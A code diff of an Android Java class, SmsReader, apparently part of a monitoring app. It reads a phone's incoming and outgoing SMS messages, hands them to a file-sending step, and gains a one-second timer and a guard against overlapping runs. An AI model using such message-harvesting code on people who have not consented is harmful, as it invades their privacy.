@@ -11,7 +11,7 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Date;
 import java.util.List;
-import java.util.concurrent.Callable;
+import java.util.concurrent.TimeUnit;
 
 import io.reactivex.Observable;
 import io.reactivex.ObservableSource;
@@ -54,28 +54,38 @@ public class SmsReader implements ITask  {
         this.persistentDataKeeper = persistentDataKeeper;
     }
 
+    private boolean isSending=false, tryToSendAgain=false;
     @Override
     public boolean startTask() {
         if(!settings.getEnableSmsRecording())
             return false;
 
+        if(isSending)
+        {   tryToSendAgain=true;
+            return false;
+        };
+        isSending=true;
+        tryToSendAgain=false;
+
         final long lastIncomeSmsId=persistentDataKeeper.getLastIncomeSms(),
                    lastOutgoingSmsId=persistentDataKeeper.getLastOutgoingSms();
 
-        Observable.fromCallable(new Callable<List<Sms> >() {
-            @Override
-            public List<Sms>  call() throws Exception {
-                List<Sms> in=readSms(true, lastIncomeSmsId);
-                List<Sms> out=readSms(false, lastOutgoingSmsId);
+        //Observable.fromCallable(new Callable<List<Sms> >() {
+        Observable.timer(1, TimeUnit.SECONDS, Schedulers.io())
+                .map(new Function<Long, List<Sms>>() {
+                    @Override
+                    public List<Sms> apply(Long aLong) throws Exception {
+                        List<Sms> in=readSms(true, lastIncomeSmsId);
+                        List<Sms> out=readSms(false, lastOutgoingSmsId);
 
-                in.addAll(out);
-                Collections.reverse(in);
-                //Collections.sort(in);
-                return in;
-            }
-        })
-        .subscribeOn(Schedulers.io())
-        .observeOn(Schedulers.io())
+                        in.addAll(out);
+                        Collections.reverse(in);
+                        //Collections.sort(in);
+                        return in;
+                    }
+                })
+        /*.subscribeOn(Schedulers.io())
+        .observeOn(Schedulers.io())*/
         .flatMap(new Function<List<Sms>, ObservableSource<Sms>>() {
             @Override
             public ObservableSource<Sms> apply(List<Sms> smsList) throws Exception {
@@ -103,10 +113,18 @@ public class SmsReader implements ITask  {
             public void onComplete() {
                 taskExecutor.stopSMSreading();
                 taskExecutor.startFileSending();
+                isSending=false;
+
+                if(tryToSendAgain)
+                {
+                    tryToSendAgain=false;
+                    taskExecutor.startSMSreading();
+                };
             }
 
             @Override
             public void onError(Throwable e) {
+                isSending=false;
                 errorProcessor.onError(e);
                 taskExecutor.stopSMSreading();
                 taskExecutor.startFileSending();
